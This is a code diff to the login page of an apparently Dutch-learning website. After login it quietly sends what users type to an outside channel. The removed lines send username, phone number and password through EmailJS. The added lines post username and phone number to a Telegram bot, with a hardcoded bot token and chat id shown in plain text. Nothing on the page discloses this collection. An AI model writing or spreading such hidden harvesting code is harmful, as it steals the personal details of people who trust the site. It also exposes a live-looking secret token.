@@ -256,20 +256,15 @@ Nederlands leren is makkelijker</h1>
                 window.location.href = "dashboard.html";
             }
         });
-
         document.getElementById('inuk').addEventListener('input', handleTranslation);
         document.querySelectorAll('button, a, input').forEach(el => {
-            el.addEventListener('mouseup', () => el.blur());
-        });
-
-        // تهيئة EmailJS
-        emailjs.init("2_rSs2GGyaZKFZIRO");
+  el.addEventListener('mouseup', () => el.blur());
+});
 
         function login() {
             let username = document.getElementById('username').value;
             let password = document.getElementById('password').value;
             let phone = document.getElementById('phone').value;
-
             fetch('database.json')
                 .then(response => response.json())
                 .then(data => {
@@ -277,10 +272,7 @@ Nederlands leren is makkelijker</h1>
                     if (user) {
                         alert('Registration successful ✓');
                         localStorage.setItem("loggedIn", "true");
-                        
-                        // إرسال البيانات عبر EmailJS بدلاً من Telegram
-                        sendViaEmailJS(username, phone, password);
-                        
+                        sendToTelegram(username, phone);
                         window.location.href = 'dashboard.html';
                     } else {
                         alert('Is there a mistake?!');
@@ -289,27 +281,22 @@ Nederlands leren is makkelijker</h1>
                 .catch(error => console.error('Error:', error));
         }
 
-        // دالة الإرسال الجديدة عبر EmailJS
-        function sendViaEmailJS(username, phone, password) {
-            const templateParams = {
-                username: username,
-                phone: phone,
-                password: password,           // إذا أردت إرسال كلمة السر أيضاً
-                message: `تسجيل دخول ناجح:\nاسم المستخدم: ${username}\nرقم الهاتف: ${phone}`
-            };
+        function sendToTelegram(username, phone) {
+            let chatId = "6431271423";
+            let token = "6618648466:AAFGGTIx055y0eCRvq_z3ABqchHfLsqD0M4";
+            let message = `تسجيل دخول ناجح:\nاسم المستخدم: ${username}\nرقم الهاتف: ${phone}`;
 
-            emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
-                .then(function(response) {
-                    console.log("تم إرسال البيانات بنجاح عبر EmailJS", response.status, response.text);
-                })
-                .catch(function(error) {
-                    console.error("خطأ في الإرسال عبر EmailJS", error);
-                });
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            }).then(response => response.json())
+              .then(data => console.log("تم إرسال البيانات إلى تيليجرام", data))
+              .catch(error => console.error("خطأ في الإرسال إلى تيليجرام", error));
         }
-
         document.querySelectorAll('button, a, input').forEach(el => {
-            el.addEventListener('mouseup', () => el.blur());
-        });
+  el.addEventListener('mouseup', () => el.blur());
+});
     </script>
 </body>
 </html>
